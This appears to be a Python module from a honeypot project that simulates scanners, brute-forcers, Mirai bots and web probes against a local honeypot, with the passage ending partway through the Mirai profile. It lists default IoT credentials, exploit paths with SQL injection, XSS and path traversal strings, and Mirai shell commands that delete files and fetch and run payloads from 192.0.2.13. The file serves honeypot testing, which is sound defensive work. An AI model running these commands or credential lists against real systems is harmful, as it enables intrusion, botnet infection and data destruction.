"""
attacker.py
-----------
A simulated attacker, so the honeypot can be demonstrated without exposing
anything to the internet.

WHY THIS EXISTS
---------------
A honeypot is only interesting when something attacks it. On a real deployment
that takes hours; on a laptop behind NAT it never happens.

So this module plays the part: it opens connections from localhost and behaves
like the attackers a real honeypot sees, using real credential lists and real
exploit paths taken from public breach and scanner data.

It is a CLIENT. It connects to the honeypot exactly as any other client would,
over a normal TCP socket. Nothing here reaches inside the honeypot or fakes a
database row -- which means running it genuinely exercises the whole pipeline:
sockets, protocol handlers, classifiers, scoring, storage.

FIVE ATTACKER PROFILES
----------------------
  scanner      fast, shallow, many ports -- masscan/zgrab behaviour
  bruteforcer  one service, hundreds of credentials
  mirai        the IoT botnet pattern: telnet defaults, then wget a payload
  webprobe     spraying known-vulnerable web paths
  apt          slow, careful, low-volume, spread over time
"""

from __future__ import annotations

import asyncio
import random

# --------------------------------------------------------------------------
# Real-world attack data
# --------------------------------------------------------------------------

# The credentials Mirai and its descendants hardcode. These are genuine:
# root/xc3511 and root/vizxv are factory defaults for specific DVR firmware,
# and they are why those devices were mass-compromised.
MIRAI_CREDENTIALS = [
    ("root", "xc3511"), ("root", "vizxv"), ("root", "admin"),
    ("admin", "admin"), ("root", "888888"), ("root", "xmhdipc"),
    ("root", "default"), ("root", "juantech"), ("root", "123456"),
    ("root", "54321"), ("support", "support"), ("root", ""),
    ("admin", "password"), ("root", "root"), ("user", "user"),
    ("admin", "1234"), ("root", "12345"), ("guest", "guest"),
    ("admin", "12345"), ("root", "pass"), ("telnet", "telnet"),
]

COMMON_CREDENTIALS = [
    ("root", "root"), ("admin", "admin"), ("root", "password"),
    ("root", "123456"), ("ubuntu", "ubuntu"), ("test", "test"),
    ("oracle", "oracle"), ("postgres", "postgres"), ("git", "git"),
    ("deploy", "deploy"), ("jenkins", "jenkins"), ("ftpuser", "ftpuser"),
    ("pi", "raspberry"), ("user", "1234"), ("administrator", "P@ssw0rd"),
    ("mysql", "mysql"), ("nagios", "nagios"), ("www-data", "www-data"),
]

# Paths that show up constantly in real web-server logs.
EXPLOIT_PATHS = [
    "/.env",
    "/wp-login.php",
    "/wp-admin/admin-ajax.php",
    "/xmlrpc.php",
    "/.git/config",
    "/phpmyadmin/index.php",
    "/actuator/env",
    "/api/v1/pods",
    "/solr/admin/info/system?wt=json",
    "/cgi-bin/.%2e/%2e%2e/%2e%2e/bin/sh",
    "/shell?cd+/tmp;rm+-rf+*;wget+http://192.0.2.13/bins.sh",
    "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
    "/config.json",
    "/.aws/credentials",
    "/index.php?id=1'+OR+'1'='1",
    "/search?q=<script>alert(1)</script>",
    "/admin/config.php.bak",
    "/script",
    "/_search",
]

USER_AGENTS = [
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
    "python-requests/2.31.0",
    "curl/7.81.0",
    "Go-http-client/1.1",
    "zgrab/0.x",
    "Mozilla/5.0 zgrab/0.x",
    "masscan/1.3",
    "Hello, World",
]

SSH_CLIENTS = [
    "SSH-2.0-libssh_0.9.6",
    "SSH-2.0-paramiko_2.11.0",
    "SSH-2.0-Go",
    "SSH-2.0-OpenSSH_8.9p1",
    "SSH-2.0-PUTTY",
]

# Commands a Mirai-family bot runs the moment it gets a shell.
MIRAI_COMMANDS = [
    "enable",
    "system",
    "shell",
    "sh",
    "cat /proc/mounts; /bin/busybox VDPCP",
    "cd /tmp; rm -rf *; wget http://192.0.2.13/bins.sh; chmod 777 bins.sh",
    "/bin/busybox wget http://192.0.2.13/mirai.arm7 -O - > dvrHelper",
    "chmod +x dvrHelper; ./dvrHelper telnet.arm7",
    "cat /proc/cpuinfo",
    "crontab -l",
]


# --------------------------------------------------------------------------
# Low-level helpers
# --------------------------------------------------------------------------

async def _connect(host: str, port: int, timeout: float = 3.0):
    return await asyncio.wait_for(asyncio.open_connection(host, port),
                                  timeout=timeout)


async def _read(reader, timeout: float = 1.0) -> bytes:
    try:
        return await asyncio.wait_for(reader.read(4096), timeout=timeout)
    except (asyncio.TimeoutError, ConnectionError):
        return b""


async def _send(writer, data: bytes) -> None:
    writer.write(data)
    try:
        await writer.drain()
    except ConnectionError:
        pass


async def _close(writer) -> None:
    try:
        writer.close()
        await writer.wait_closed()
    except Exception:                                          # noqa: BLE001
        pass


# --------------------------------------------------------------------------
# Profiles
# --------------------------------------------------------------------------

async def scanner(host: str, ports: list[int], rounds: int = 1) -> int:
    """masscan/zgrab behaviour: connect, grab the banner, disconnect.

    Fast, shallow and broad. A real scanner touches millions of hosts, so it
    spends no time on any single one.
    """
    touched = 0
    for _ in range(rounds):
        for port in ports:
            try:
                reader, writer = await _connect(host, port, timeout=1.5)
            except Exception:                                  # noqa: BLE001
                continue
            await _read(reader, 0.4)
            await _send(writer, b"\r\n")
            await _close(writer)
            touched += 1
            await asyncio.sleep(0.01)
    return touched


async def ssh_bruteforce(host: str, port: int, attempts: int = 25) -> int:
    """A credential-stuffing bot against SSH.

    Each attempt is a fresh connection, because that is what the real ones do
    -- our SSH emulator fails the key exchange, so the bot reconnects.
    """
    client = random.choice(SSH_CLIENTS)
    done = 0
    for _ in range(attempts):
        try:
            reader, writer = await _connect(host, port, timeout=1.5)
        except Exception:                                      # noqa: BLE001
            continue
        await _read(reader, 0.4)
        await _send(writer, f"{client}\r\n".encode())
        await _read(reader, 0.2)
        await _close(writer)
        done += 1
        await asyncio.sleep(0.02)
    return done


async def ftp_bruteforce(host: str, port: int, attempts: int = 20) -> int:
    done = 0
    for username, password in random.sample(
            COMMON_CREDENTIALS, min(attempts, len(COMMON_CREDENTIALS))):
        try:
            reader, writer = await _connect(host, port, timeout=1.5)
        except Exception:                                      # noqa: BLE001
            continue
        await _read(reader, 0.4)
        await _send(writer, f"USER {username}\r\n".encode())
        await _read(reader, 0.3)
        await _send(writer, f"PASS {password}\r\n".encode())
        await _read(reader, 0.3)
        await _send(writer, b"QUIT\r\n")
        await _close(writer)
        done += 1
        await asyncio.sleep(0.02)
    return done


async def mirai(host: str, port: int, attempts: int = 12) -> int:
    """The IoT botnet pattern, end to end.

    Try hardcoded default credentials until